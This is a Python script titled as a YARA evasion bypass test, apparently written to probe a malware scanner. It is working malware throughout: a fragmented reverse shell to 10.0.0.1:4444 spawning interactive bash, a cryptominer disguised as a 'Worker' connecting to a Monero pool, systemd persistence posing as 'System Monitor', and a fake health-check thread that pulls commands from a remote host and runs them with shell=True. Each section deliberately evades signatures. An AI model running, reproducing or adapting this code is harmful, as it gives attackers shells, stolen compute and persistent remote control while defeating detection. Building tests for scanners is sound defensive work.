#!/usr/bin/env python3
"""
BYPASS TEST 4: YARA Pattern Evasion

Attempts to implement malicious functionality while avoiding YARA-like
signature detection by fragmenting strings and using indirect patterns.
"""
import socket
import time

# --- Technique 1: String fragmentation for reverse shell ---
# Instead of "socket.connect(('10.0.0.1', 4444))"
host_parts = ['10', '.', '0', '.', '0', '.', '1']
host = ''.join(host_parts)
port = int('4' + '4' + '4' + '4')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# --- Technique 2: Avoid "subprocess" keyword ---
import importlib
sp = importlib.import_module('sub' + 'process')
# Instead of subprocess.call(["/bin/bash", "-i"])
shell_path = '/' + 'bin' + '/' + 'ba' + 'sh'
sp.call([shell_path, '-i'])

# --- Technique 3: Cryptominer without obvious keywords ---
# No "stratum", "xmrig", "mining" etc.
import hashlib
import struct

class Worker:
    """Parallel computation worker."""
    def __init__(self, server, port, wallet):
        self.server = server
        self.port = port
        self.wallet = wallet
        self.sock = socket.socket()

    def connect(self):
        # Connect to "computation server" (actually mining pool)
        self.sock.connect((self.server, self.port))
        # Send authentication (actually mining login)
        auth = f'{{"id":1,"method":"login","params":{{"login":"{self.wallet}"}}}}'
        self.sock.sendall(auth.encode())

    def compute(self):
        """Main computation loop (actually mining)."""
        while True:
            data = self.sock.recv(4096)
            if not data:
                break
            # "Process" the data (actually hash computation)
            nonce = 0
            target = data[:32]
            while True:
                attempt = hashlib.sha256(target + struct.pack('<I', nonce)).digest()
                if attempt[:3] == b'\x00\x00\x00':
                    self.sock.sendall(f'{{"id":2,"result":"{nonce}"}}'.encode())
                    break
                nonce += 1

# Looks like a generic worker but is actually a miner
w = Worker("pool.moneroocean.stream", 10001, "4ABC123wallet456address")
w.connect()
w.compute()


# --- Technique 4: Persistence without obvious crontab/registry ---
import platform
import tempfile

def install():
    """Setup auto-start (persistence)."""
    if platform.system() == 'Linux':
        # Use systemd user service instead of crontab
        svc = """[Unit]
Description=System Monitor
[Service]
ExecStart=/usr/bin/python3 {path}
Restart=always
[Install]
WantedBy=default.target"""
        import pathlib
        svc_dir = pathlib.Path.home() / '.config' / 'systemd' / 'user'
        svc_dir.mkdir(parents=True, exist_ok=True)
        (svc_dir / 'sysmon.service').write_text(svc.format(path=__file__))

install()


# --- Technique 5: C2 beacon without obvious loop pattern ---
import threading
import random

def health_check():
    """Periodic health reporting (actually C2 beacon)."""
    import urllib.request
    while True:
        delay = random.randint(30, 120)
        time.sleep(delay)
        try:
            resp = urllib.request.urlopen(f"https://api.legit-service.com/health")
            cmd = resp.read().decode()
            if cmd and cmd != "ok":
                sp.call(cmd, shell=True)
        except Exception:
            pass

t = threading.Thread(target=health_check, daemon=True)
t.start()
